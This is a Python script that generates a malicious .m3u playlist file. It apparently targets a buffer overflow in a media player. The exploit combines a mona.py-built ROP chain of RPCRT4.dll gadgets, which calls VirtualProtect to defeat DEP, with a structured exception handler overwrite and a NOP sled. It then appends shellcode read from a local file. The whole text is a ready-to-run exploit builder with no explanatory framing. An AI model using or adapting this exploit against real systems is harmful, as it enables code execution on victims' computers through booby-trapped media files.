#! python

from struct import pack


def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        #[---INFO:gadgets_to_set_esi:---]
        0x76cfa6ca,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76cc02c4,  # ptr to &VirtualProtect() [IAT RPCRT4.dll] ** REBASED ** ASLR
        0x76d1bb0c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76d07b94,  # XCHG EAX,ESI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x76d3d641,  # POP EBP # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76d07f75,  # & jmp esp [RPCRT4.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        0x76d222c5,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x76d11232,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76cfa178,  # XCHG EAX,EBX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        0x76d481c7,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x76ccf3ea,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76ce0647,  # XCHG EAX,EDX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x76d0d3c5,  # POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76d70406,  # &Writable location [RPCRT4.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x76cd6c37,  # POP EDI # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x76d621a3,  # RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x76d2960f,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x76cc7227,  # PUSHAD # RETN [RPCRT4.dll] ** REBASED ** ASLR 
    ]
    return b''.join(pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

# junk = b"http://" + b"\x41" * 689
junk = b"http://" + b"A" * 321
junk +=  rop_chain + b"\x90" * (368 - len(rop_chain))
nseh = bytes(pack('<I',0x909014eb))
seh = bytes(pack('<I',0x66011b56))
nops= b"\x90" * 20

bin = "micah"
shellcode = b""

with open(bin, 'rb') as f:
    shellcode = f.read()
f.close()

junkD = b"D" * (2572 - (len(junk + nseh + seh + nops + shellcode)))
exploit = junk + nseh + seh + nops + shellcode + junkD

file= open("Exploit.m3u",'wb')
file.write(exploit)
file.close()

print("[*] Exploit has been created!")

print(shellcode)


# 0x76d529ad :  # ADD ESP,0C # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}
# 0x76d3d663 :  # MOV ESP,EBP # POP EBP # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}
# 0x76d07bf0 (RVA : 0x00057bf0) : # XCHG EAX,ECX # RETN    ** [RPCRT4.dll] **   |   {PAGE_EXECUTE_READ}
